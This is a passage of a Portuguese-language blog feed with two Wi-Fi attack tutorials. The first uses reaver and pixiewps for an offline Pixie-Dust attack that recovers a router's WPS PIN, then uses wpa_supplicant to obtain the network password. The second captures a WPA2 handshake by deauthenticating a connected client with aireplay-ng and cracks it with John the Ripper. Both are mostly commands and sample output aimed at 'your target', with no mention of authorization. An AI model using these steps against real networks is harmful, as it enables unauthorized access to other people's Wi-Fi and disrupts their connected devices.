</code></pre></div></div> <h5 id="os-aps-com-o-wps-ativado-apareceram-nessa-coluna-com-a-versão-do-wps-que-o-ap-possui-pode-acontecer-de-alguns-aps-ficarem-com-um-espaço-vazio-nessa-coluna-isso-é-porque-o-wps-está-desativado">Os APs com o WPS ativado apareceram nessa coluna com a versão do wps que o AP possui. Pode acontecer de alguns APs ficarem com um espaço vazio nessa coluna, isso é porque o wps está desativado.</h5> <h5 id="depois-de-ter-identificado-seu-alvo-a-ferramenta-utilizada-para-fazer-o-ataque-ao-wps-será-a-reaver-link-no-final-da-pg-com-o-seguinte-comando">Depois de ter identificado seu alvo, a ferramenta utilizada para fazer o ataque ao WPS será a Reaver (link no final da pg) com o seguinte comando:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo reaver -i &lt;interface&gt; -c &lt;channel&gt; -b &lt;mac do ap&gt; -vv -K 1
(precisa da flag -vv)
</code></pre></div></div> <h5 id="o-resultado-pode-variar-um-pouco-porque-depende-muito-do-roteador-que-está-sendo-atacado-essa-falha-é-relativa-ao-firmware-do-roteador-não-sendo-todos-os-roteadores-vulneráveis-você-pode-ver-alguns-exemplos-de-saida-aqui--httpsforumskaliorgshowthreadphp25123-reaver-modfication-for-pixie-dust-attack-ou-pesquisar-por-conta-própria-e-ver-vários-resultados-diferentes-que-as-pessoas-conseguem-por-ai--mas-saída-que-deu-certo-pra-mim-foi-semelhante-a-essa">O resultado pode variar um pouco porque depende muito do roteador que está sendo atacado. Essa falha é relativa ao firmware do roteador, não sendo todos os roteadores vulneráveis. Você pode ver alguns exemplos de saida aqui ==&gt; (https://forums.kali.org/showthread.php?25123-Reaver-modfication-for-Pixie-Dust-Attack) ou pesquisar por conta própria e ver vários resultados diferentes que as pessoas conseguem por ai … mas saída que deu certo pra mim foi semelhante a essa:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo reaver -i &lt;interface&gt; -c &lt;channel&gt; -b 01:D0:30:4A:49:45 -vv -K 1

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;

[+] Switching wlan0 to channel 2
[+] Waiting for beacon from 01:D0:30:4A:49:45
[+] Received beacon from 01:D0:30:4A:49:45
[+] Vendor: RalinkTe
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 01:D0:30:4A:49:45 (ESSID: "nome qualquer")
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
executing pixiewps -e 
313ff74331338ed2d66cc580c997ee805df43626d3dfda23328688e110e5676b7aa9d36640956c1d5b712835a0b07a7ec2ac2363e44336232cf5c11517096bad3c95bc2db3f537c41cf0a80036e
5b680e3e1e130a9303c14f77abca481e4911f590148387c6dc2839e2820a028f9d9c0767d25216c01260c011259cbd30c846ada8da47e5dc9d3dbe99953d9f8ef547d42b3152f581e790aae608c
6b112aac298cb121a60b6ec8849f23497234685b05b53a632526765dbf12642ed0ee8213fb -s c6987c052c458512a2972cfacc923e4c61c9502723676b9493d1b783062ecg16 -z 
72e3a7f04f5eb1cdd4602fb15443099f82d56a02ccad15774ea873c84b4b1b0b -a 3c63e889ae1d26a4441e2f9fbf7b673ff4aee85889383d88dc3707253d155d6b -n 
db396a9e4066be20697a0e236d3aaef7 -r 
29722c42863986dd84a965db99fca766e49c04e58c70f3cc0526b1d6efa0798d3a8023d533f87ea70g6551e50274d40e6c19dd6b3842b496e8c5fc2efc62dd67dc0ad5276aa21321fb68a70bbe6
9d6d6f27e5fb61ff29411a35c9d8e7084d8920cba3656a628ed5e7559ce53804ed85ea840221a73e8fb277c1ff86be187fb4008608c1f086637b045078cfa4c5dfe797d10d866322331866a6cf8
1651af877ad5f074be7c94a5db570d9c467dbf6aa048b48e16bfe98a265657a764b4d09fa7a

 Pixiewps 1.4

 [?] Mode:     1 (RT/MT/CL)
 [*] Seed N1:  0x2e6f2d71
 [*] Seed ES1: 0x7f3d488f
 [*] Seed ES2: 0x4104ca5d
 [*] PSK1:     e7868366f236b343dc0777209b87a214
 [*] PSK2:     95a24c483176fadddc4469a305e893b2
 [*] ES1:      3dd1a7d64b65cbe1bd80ab4359css07e
 [*] ES2:      5502dec86e7ae960a247f6b8aa9c513d
 [+] WPS pin:  18630248   &lt;==== PIN AQUI

 [*] Time taken: 0 s 294 ms
</code></pre></div></div> <p>(você pode executar o comando “pixiewps” sugerido pela própria ferramenta, que trará o mesmo resultado do pin recuperado)</p> <h5 id="dependendo-do-resultado-do-ataque-o-reaver-consegue-recuperar-apenas-o-pin-do-wps-como-mostrado-acima-nos-meus-testes-foi-esse-resultado-que-consegui-então-a-idéia-é-essa-recuperar-o-pin-com-o-ataque-offline-pixie-dust-depois-se-conectar-ao-ap-com-o-pin-recuperado-para-então-pegar-o-psk">Dependendo do resultado do ataque, o reaver consegue recuperar apenas o PIN do WPS como mostrado acima. Nos meus testes foi esse resultado que consegui. Então a idéia é essa: recuperar o PIN com o ataque offline pixie-dust, depois se conectar ao AP com o pin recuperado para então pegar o psk.</h5> <h4 id="para-se-conectar-ao-ap-pelo-wps-com-o-pin-faça-o-seguindo">Para se conectar ao AP pelo WPS com o PIN faça o seguindo:</h4> <ol> <li><strong><em>Crie o arquivo wpa_supplicant.conf em /etc/ e nesse arquivo vai as seguintes linhas</em></strong>:</li> </ol> <blockquote> <p>ctrl_interface=/var/run/wpa_supplicant</p> <p>ctrl_interface_group=0</p> <p>update_config=1</p> </blockquote> <ol> <li><strong><em>Inicie o wpa_supplicant, com o arquivo de configuração /etc/wpa_supplicant.conf</em></strong>: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wpa_supplicant -Dwext -iwlan0 -c /etc/wpa_supplicant.conf
</code></pre></div> </div> </li> <li><strong><em>Em outro terminal inicie o wpa_cli para realizar a conexão ao ponto de acesso por meio do número PIN</em></strong>: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wpa_cli wps_reg 74:EA:3A:E1:E8:66 02283470
                  &lt;mac do ap&gt;    &lt;pin wps&gt;
</code></pre></div> </div> </li> <li><strong><em>O wpa_supplicant fará a conexão ao ponto de acesso. No terminal em que o wpa_supplicant foi iniciado é retornado uma mensagem de que a conexão foi bem-sucedida</em></strong>: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wpa_supplicant -Dwext -iwlan0 -c /etc/wpa_supplicant.conf
ioctl[SIOCSIWENCODEEXT]: Invalid argument
ioctl[SIOCSIWENCODEEXT]: Invalid argument
wlan0: Failed to initiate AP scan
wlan0: Trying to associate with 74:ea:3a:e1:e8:66 (SSID='TP-LINK_E1E866' freq=2462 MHz)
wlan0: Associated with 74:ea:3a:e1:e8:66
wlan0: WPA: Key negotiation completed with 74:ea:3a:e1:e8:66 [PTK=CCMP GTK=CCMP]
wlan0: CTRL-EVENT-CONNECTED - Connection to 74:ea:3a:e1:e8:66
completed (auth) [id=1 id_str=]
</code></pre></div> </div> </li> <li><strong><em>Visualize o conteúdo do arquivo /etc/wpa_supplicant.conf com a senha wireless da rede</em></strong>: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /etc/wpa_supplicant.conf
network={
ssid="TP-LINK_E1E866"
bssid=74:ea:3a:e1:e8:66
psk="senha123"
proto=RSN
key_mgmt=WPA-PSK
pairwise=CCMP
auth_alg=OPEN
}
</code></pre></div> </div> </li> </ol> <p>referencia:</p> <ul> <li>https://novatec.com.br/livros/pentest-redes-sem-fio/</li> <li>https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access#WPS_PIN_recovery</li> <li>https://en.wikipedia.org/wiki/Wi-Fi_Protected_Setup</li> <li>https://github.com/wiire-a/pixiewps</li> <li>https://github.com/t6x/reaver-wps-fork-t6x</li> <li>https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)</li> </ul>]]></content><author><name></name></author><category term="wifi"/><summary type="html"><![CDATA[recuperando psk ...]]></summary></entry><entry><title type="html">Crack WPA2</title><link href="https://geleiaa.github.io/blog/2022/crackwpa/" rel="alternate" type="text/html" title="Crack WPA2"/><published>2022-07-09T00:00:00+00:00</published><updated>2022-07-09T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2022/crackwpa</id><content type="html" xml:base="https://geleiaa.github.io/blog/2022/crackwpa/"><![CDATA[<h1 id="capturando-handshake-e-quebrando-o-hash-da-psk">Capturando handshake e quebrando o hash da psk</h1> <blockquote> <p>Para esse ataque você vai precisar de:</p> <p>1 - um adaptador wifi com um chiset que suporte no minimo monitor-mode e package-injection</p> <p>2 - a suite aircrack-ng</p> <p>3 - john the ripper</p> </blockquote> <hr/> <h1 id="primeiro-passo">Primeiro passo:</h1> <h2 id="verificar-se-seu-chipset-suporta-o-modo-monitor">verificar se seu chipset suporta o modo monitor.</h2> <h6 id="mostra-informações-sobre-a-interfaceplaca-de-rede">Mostra informações sobre a interface/placa de rede:</h6> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ iw list   
</code></pre></div></div> <h6 id="na-saida-do-comando-procure-por-isso">na saida do comando procure por isso:</h6> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Supported interface modes:
		 * managed
		 * monitor
</code></pre></div></div> <p>ou</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo airmon-ng (com --verbose p/ mais detalhes)
</code></pre></div></div> <h5 id="mostrara-o-nome-da-interface-e-o-chipset-depois-você-pode-pesquisar-para-saber-os-modos-que-chipset-suporta">Mostrara o nome da interface e o chipset, depois você pode pesquisar para saber os modos que chipset suporta.</h5> <h5 id="a-saida-será-parecida-com-essa">A saida será parecida com essa:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PHY	Interface	Driver		Chipset

phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
</code></pre></div></div> <hr/> <h1 id="segundo-passo">Segundo passo:</h1> <h2 id="colocar-sua-interface-em-monitor-mode">Colocar sua interface em monitor mode</h2> <h5 id="matar-porcessos-que-interferem-no-modo-monitor">Matar porcessos que interferem no modo monitor:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo airmon-ng check kill 
</code></pre></div></div> <h5 id="a-saida-será-parecida-com-essa-1">A saida será parecida com essa:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Killing these processes:

  PID Name
  870 dhclient
 1115 wpa_supplicant
</code></pre></div></div> <h5 id="depois-dar-um-start-na-interface">Depois dar um “start” na interface</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo airmon-ng start &lt;interface&gt; 
</code></pre></div></div> <h5 id="a-saida-será-parecida-com-essa-2">A saida será parecida com essa:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PHY	Interface	Driver		Chipset

phy0	wlan0mon	ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
		(mac80211 station mode vif enabled on [phy0]wlan0)
		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)
</code></pre></div></div> <h5 id="-iwconfig-para-confirmar-que-a-interface-esta-em-monitor-mode">$ iwconfig para confirmar que a interface esta em monitor-mode</h5> <h5 id="se-a-interface-estiver-em-monitor-mode-você-vai-isso">Se a interface estiver em monitor-mode você vai isso:</h5> <h5 id="repare-em-modemonitor">(repare em Mode:Monitor)</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ath0      IEEE 802.11g  ESSID:""  
        Mode:Monitor  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82   
        Bit Rate=2 Mb/s   Tx-Power:18 dBm   Sensitivity=0/3  
        Retry:off   RTS thr:off   Fragment thr:off
        Encryption key:off
        Power Management:off
        Link Quality=0/94  Signal level=-96 dBm  Noise level=-96 dBm
        Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
        Tx excessive retries:0  Invalid misc:0   Missed beacon:0
</code></pre></div></div> <hr/> <h1 id="terceiro-passo">Terceiro passo</h1> <h5 id="sniffar-redes-em-volta-para-identificar-seu-alvo">“Sniffar” redes em volta para identificar seu alvo</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo airodump-ng &lt;interface&gt;
</code></pre></div></div> <h5 id="a-saida-sera-parecida-com-essa">A saida sera parecida com essa:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ]
                                                                                                            
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                            
 00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN              NETGEAR                         
 00:14:6C:7A:41:81   34 100       57       14    1   9  11e  WEP  WEP         bigbear 
 00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy                             
                                                                                                            
 BSSID              STATION            PWR   Rate   Lost  Packets  Notes  Probes
                                
 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14
 (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4           mossy 
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           teddy
</code></pre></div></div> <ul> <li>BSSID = Mac Address do AP (roteador)</li> <li>ESSID = nome que identifica o AP</li> <li>CH = canal em que o AP esta operando</li> <li>STATION = Mac Address de dispositivos conectados aos APs</li> </ul> <hr/> <h1 id="quarto-passo">Quarto passo</h1> <h5 id="depois-de-identificar-o-alvo-comece-a-captura-dos-pacotes-focada-na-rede-alvo">Depois de identificar o alvo, comece a captura dos pacotes focada na rede alvo:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo airodump-ng --bssid &lt;macaddr&gt; -c &lt;canal&gt; -w &lt;arquivo&gt; &lt;interface&gt;
</code></pre></div></div> <blockquote> <p><code class="language-plaintext highlighter-rouge">--bssid</code> mac address do AP alvo</p> <p><code class="language-plaintext highlighter-rouge">-c</code> seleciona o canal do AP para evitar perda de pacotes</p> <p><code class="language-plaintext highlighter-rouge">-w</code> para gravar captura em um arquivo .cap</p> </blockquote> <hr/> <h1 id="quinto-passo">Quinto passo</h1> <h5 id="enquanto-o-trafego-do-alvo-é-capturado-você-devera-fazer-um-ataque-de-deauthentication-em-um-dispositivo-que-está-conectado-ao-ap-em-seguida-o-dispositivo-irá-se-conectar-de-novo-automaticamente-ou-manualmente-por-uma-pessoa-e-nessa-hora-o-handshake-é-capturado">Enquanto o trafego do alvo é capturado, você devera fazer um ataque de Deauthentication em um dispositivo que está conectado ao AP. Em seguida o dispositivo irá se conectar de novo automaticamente (ou manualmente por uma pessoa). E nessa hora o HANDSHAKE é capturado…</h5> <h5 id="para-desautenticar-uma-station-de-um-ap-use-o-aireplay-ng">Para desautenticar uma STATION de um AP use o aireplay-ng:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ aireplay-ng -0 1 -a &lt;macAP&gt; -c &lt;macSTATION&gt; &lt;interface&gt;
</code></pre></div></div> <blockquote> <p>-0 especifica o Deauthentication attack <br/> 1 é o número de deauths a serem enviados<br/> -a mac do AP alvo <br/> -c mac do dispositivo cliente para desautenticar</p> </blockquote> <h5 id="a-saida-sera-parecida-com-essa-1">A saida sera parecida com essa:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>12:35:25  Waiting for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 9
12:35:25  Sending 64 directed DeAuth. STMAC: [00:0F:B5:AE:CE:9D] [ 61|63 ACKs]

[ ACKs recebidos da STATION | ACKs recebidos do AP]
</code></pre></div></div> <hr/> <h1 id="sexto-passo">Sexto passo</h1> <h5 id="se-o-quinto-passo-for-bem-sucedido-no-terminal-do-airodump-ng-capturando-o-trafego-da-rede-alvo-aparecera-a-confirmação-de-que-o-handshake-foi-capturado--wpa-handshake-00146c7e4080">Se o Quinto passo for bem sucedido, no terminal do airodump-ng capturando o trafego da rede alvo aparecera a confirmação de que o handshake foi capturado [ WPA handshake: 00:14:6C:7E:40:80</h5> <p>Exemplo:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7E:40:80 ]
                                                                                                           
         BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                           
         00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN              NETGEAR                         
         00:14:6C:7A:41:81   34 100       57       14    1   9  11e  WEP  WEP         bigbear 
         00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy       
</code></pre></div></div> <h5 id="depois-do-handshake-capturado-você-já-pode-encerrar-a-captura-e-se-você-verifcar-o-diretorio-atual-verá-alguns-arquivos-incluindo-um-arquivo-arquivocap">Depois do handshake capturado você já pode encerrar a captura e se você verifcar o diretorio atual verá alguns arquivos incluindo um arquivo arquivo.cap</h5> <h5 id="e-depois-da-captura-ser-feita-você-pode-colocar-a-interface-de-volta-em-modo-managed">E depois da captura ser feita, você pode colocar a interface de volta em modo Managed</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo airmon-ng stop &lt;interface&gt;  # encerrar o modo monitor

depois

$ service network-manager start  # reinicia o gerenciador de rede
</code></pre></div></div> <p>($ iwconfig para confirmar o modo que a interface esta)</p> <hr/> <h1 id="setimo-passo">Setimo passo</h1> <h5 id="você-pode-verificar-se-os-pacotes-de-autenticação-foram-capturados-com-sucesso-abrindo-o-arquivo-cap-no-wireshark-e-filtrando-os-pacotes-eapol-dessa-forma">Você pode verificar se os pacotes de autenticação foram capturados com sucesso abrindo o arquivo .cap no wireshark e filtrando os pacotes <code class="language-plaintext highlighter-rouge">EAPOL</code> dessa forma:</h5> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/eapol-ex.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>(os pacotes m1 até m4 precisam ser capturados)</p> <ul> <li>mais informações aqui: (https://community.cisco.com/t5/wireless-mobility-knowledge-base/802-11-sniffer-capture-analysis-wpa-wpa2-with-psk-or-eap/ta-p/3116990)</li> </ul> <h5 id="depois-do-handshake-capturado-há-algumas-formas-de-extrair-só-a-parte-que-interessa-uma-delas-é-com-uma-ferramenta-wpapcap2john-do-pacote-john-the-ripper">Depois do HANDSHAKE capturado há algumas formas de extrair só a parte que interessa. Uma delas é com uma ferramenta wpapcap2john do pacote John The Ripper.</h5> <h5 id="se-o-handshake-foi-capturado-corretamente-a-ferramenta-pode-extrair-um-hash-da-senha-psk-com-seguinte-comando">Se o handshake foi capturado corretamente a ferramenta pode extrair um hash da senha (psk) com seguinte comando:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wpapcap2john arquivo.cap &gt; &lt;arquivo de saida&gt; 
</code></pre></div></div> <h5 id="no-arquivo-ficara-um-hash-parecido-com-esse">No arquivo ficara um hash parecido com esse:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ESSID:$WPAPSK$ESSID#x3EU5Y3o1jRkE5hTM0qamIqSFyApa7cBSX5AZFNCidtAkKPdtQ1uyW2Hv1z8s4BrRP7aFIZy19Jsvy9hMhX5O8FRp2P1UaDjQ8MpZE21.5I0.Ec................wzRUT2
b9IE63q1mc:0ef770407b5f:f454201e4174:f454201e4174::WPA2, verified:arquivo.cap
</code></pre></div></div> <hr/> <h1 id="oitavo-passo">Oitavo passo</h1> <h5 id="com-o-hash-em-mãos-é-só-fazer-o-brute-force-o-exemplo-será-com-john-the-ripper-porque-a-conversão-do-hash-feito-pela-ferramenta-wpapcap2john-resulta-em-um-formato-de-hash-próprio-para-o-jtr">Com o hash em mãos é só fazer o brute-force (o exemplo será com John The Ripper porque a conversão do hash feito pela ferramenta wpapcap2john resulta em um formato de hash próprio para o JTR)</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john hash.txt --wordlist=rockyou.txt --format=wpapsk
</code></pre></div></div> <p>Nota importante: Se for uma senha forte vai ser dificil de quebrar e esse ataque se torna inviável.</p>]]></content><author><name></name></author><category term="wifi"/><summary type="html"><![CDATA[recuperando psk ...]]></summary></entry></feed>